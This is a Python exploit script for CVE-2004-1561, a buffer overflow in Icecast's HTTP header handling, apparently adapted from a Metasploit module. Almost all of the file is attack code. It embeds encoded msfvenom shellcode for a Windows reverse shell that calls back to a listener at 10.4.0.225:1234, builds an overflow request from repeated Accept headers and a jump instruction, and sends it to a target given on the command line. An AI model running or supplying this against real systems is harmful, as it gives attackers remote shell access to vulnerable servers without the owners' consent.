#CVE-2004-1561
#Derived from metasploit module

import sys
import socket

#usage python ice.py <rhost> <rport>
rhost = sys.argv[1]
rport = int(sys.argv[2])

#msfvenom -p windows/shell_reverse_tcp LHOST=10.4.0.225 LPORT=1234 -e x86/shikata_ga_nai -b '\x0d\x0a\x00' -s 2000 -f python
buf =  b""
buf += b"\xd9\xc3\xd9\x74\x24\xf4\xbb\xf4\xf8\x83\x91\x5d"
buf += b"\x2b\xc9\xb1\x52\x31\x5d\x17\x83\xc5\x04\x03\xa9"
buf += b"\xeb\x61\x64\xad\xe4\xe4\x87\x4d\xf5\x88\x0e\xa8"
buf += b"\xc4\x88\x75\xb9\x77\x39\xfd\xef\x7b\xb2\x53\x1b"
buf += b"\x0f\xb6\x7b\x2c\xb8\x7d\x5a\x03\x39\x2d\x9e\x02"
buf += b"\xb9\x2c\xf3\xe4\x80\xfe\x06\xe5\xc5\xe3\xeb\xb7"
buf += b"\x9e\x68\x59\x27\xaa\x25\x62\xcc\xe0\xa8\xe2\x31"
buf += b"\xb0\xcb\xc3\xe4\xca\x95\xc3\x07\x1e\xae\x4d\x1f"
buf += b"\x43\x8b\x04\x94\xb7\x67\x97\x7c\x86\x88\x34\x41"
buf += b"\x26\x7b\x44\x86\x81\x64\x33\xfe\xf1\x19\x44\xc5"
buf += b"\x88\xc5\xc1\xdd\x2b\x8d\x72\x39\xcd\x42\xe4\xca"
buf += b"\xc1\x2f\x62\x94\xc5\xae\xa7\xaf\xf2\x3b\x46\x7f"
buf += b"\x73\x7f\x6d\x5b\xdf\xdb\x0c\xfa\x85\x8a\x31\x1c"
buf += b"\x66\x72\x94\x57\x8b\x67\xa5\x3a\xc4\x44\x84\xc4"
buf += b"\x14\xc3\x9f\xb7\x26\x4c\x34\x5f\x0b\x05\x92\x98"
buf += b"\x6c\x3c\x62\x36\x93\xbf\x93\x1f\x50\xeb\xc3\x37"
buf += b"\x71\x94\x8f\xc7\x7e\x41\x1f\x97\xd0\x3a\xe0\x47"
buf += b"\x91\xea\x88\x8d\x1e\xd4\xa9\xae\xf4\x7d\x43\x55"
buf += b"\x9f\x8b\x9f\x19\x87\xe4\x9d\xa1\x14\xd8\x28\x47"
buf += b"\x30\x32\x7d\xd0\xad\xab\x24\xaa\x4c\x33\xf3\xd7"
buf += b"\x4f\xbf\xf0\x28\x01\x48\x7c\x3a\xf6\xb8\xcb\x60"
buf += b"\x51\xc6\xe1\x0c\x3d\x55\x6e\xcc\x48\x46\x39\x9b"
buf += b"\x1d\xb8\x30\x49\xb0\xe3\xea\x6f\x49\x75\xd4\x2b"
buf += b"\x96\x46\xdb\xb2\x5b\xf2\xff\xa4\xa5\xfb\xbb\x90"
buf += b"\x79\xaa\x15\x4e\x3c\x04\xd4\x38\x96\xfb\xbe\xac"
buf += b"\x6f\x30\x01\xaa\x6f\x1d\xf7\x52\xc1\xc8\x4e\x6d"
buf += b"\xee\x9c\x46\x16\x12\x3d\xa8\xcd\x96\x4d\xe3\x4f"
buf += b"\xbe\xc5\xaa\x1a\x82\x8b\x4c\xf1\xc1\xb5\xce\xf3"
buf += b"\xb9\x41\xce\x76\xbf\x0e\x48\x6b\xcd\x1f\x3d\x8b"
buf += b"\x62\x1f\x14"
                
evul = "\xeb\x0c / HTTP/1.1 "
evul += buf
evul += "\r\n"
evul += "Accept: text/html\r\n" * 31;

# jmp [esp+4]
evul += "\xff\x64\x24\x04\r\n"
evul += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))
s.sendall(evul)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
